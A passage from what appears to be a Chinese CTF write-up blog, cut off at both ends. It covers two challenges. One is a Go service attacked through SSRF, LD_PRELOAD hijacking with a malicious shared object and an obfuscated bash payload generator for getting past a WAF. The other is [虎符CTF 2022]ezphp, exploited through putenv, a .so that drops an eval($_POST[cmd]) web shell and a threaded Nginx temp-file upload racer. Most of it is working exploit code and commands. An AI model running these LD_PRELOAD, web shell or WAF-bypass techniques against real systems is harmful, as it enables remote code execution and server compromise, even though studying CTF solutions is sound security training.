&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">IndexHandler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FileServer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Dir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dist/static&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Handle&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/static/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StripPrefix&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/static/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/token&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/upload&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">uploadFile&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/list&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">listFile&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start listen 9090&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:9090&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ListenAndServe: &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以我们需要SSRF访问9091端口的/manage 并且绕waf进行命令注入读flag&lt;/p>
&lt;p>注意到web服务的/token路由可以设置环境变量，我们自然想到利用LD_PRELOAD和恶意.so来劫持系统函数进行rce&lt;/p>
&lt;p>传文件，通过web的&lt;code>/token?http_proxy=http://127.0.0.1:8080&lt;/code>可以获得当前token（即上传目录&lt;/p>
&lt;p>之后上传恶意.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">constructor&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">l3yx&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">unsetenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_evilcmd&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC e.c -o e.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>/token?LD_PRELOAD=/code/uploads/{token}&amp;amp;_evilcmd=ls%20-l%20/&amp;amp;http_proxy=127.0.0.1:8080&lt;/code>下进行注入，成功rce&lt;/p>
&lt;p>之后弹个shell&lt;/p>
&lt;p>最后，对于waf，用这个（之前也见过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;0&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;${##}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$((${##}&amp;lt;&amp;lt;${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$((${##}&amp;lt;&amp;lt;$((${##}&amp;lt;&amp;lt;${##}))))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}0${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}${##}0))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}${##}${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">str_to_oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">))))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">o&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;$0&amp;lt;&amp;lt;&amp;lt;$0\&amp;lt;\&amp;lt;\&amp;lt;\$&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str_to_oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:]:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat /flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>curl &amp;quot;http://localhost:9091/manage?m=%3b{urlencode(payload)}&amp;quot;&lt;/code>&lt;/p>
&lt;h3 id="虎符ctf-2022ezphp">[虎符CTF 2022]ezphp&lt;/h3>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s?__biz=Mzg2MjYxMjAzMg==&amp;amp;mid=2247483903&amp;amp;idx=1&amp;amp;sn=26b6af39bc1bf9a0055c0be38a666472&amp;amp;chksm=ce047ed0f973f7c6b7a2ee4a300d10d22cf2a6e38fcbe5190011c8f08b14da9a30db2bf11061&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=0321x9PydhpbLJpuag0EBm4W&amp;amp;sharer_sharetime=1647861577180&amp;amp;sharer_shareid=3679f20229d72930158c21ee7f573b1e#rd">wp&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;env&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;env&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;echo hfctf2022&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>oneline php，看到这个putenv再结合前面的栗子应该不陌生了就，结合Nginx上传临时文件 传.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">$_POST[cmd]);?&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200"> &amp;gt; /var/www/html/ame.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -fPIC -shared evil.c -o evil.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">URL2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:30002/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">nginx_workers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">14&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">21&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">24&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">25&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">26&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">27&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">done&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">uploader&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] starting uploader&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exp.so&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">done&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">URL2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">uploader&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">bruter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#111">):&lt;/span>
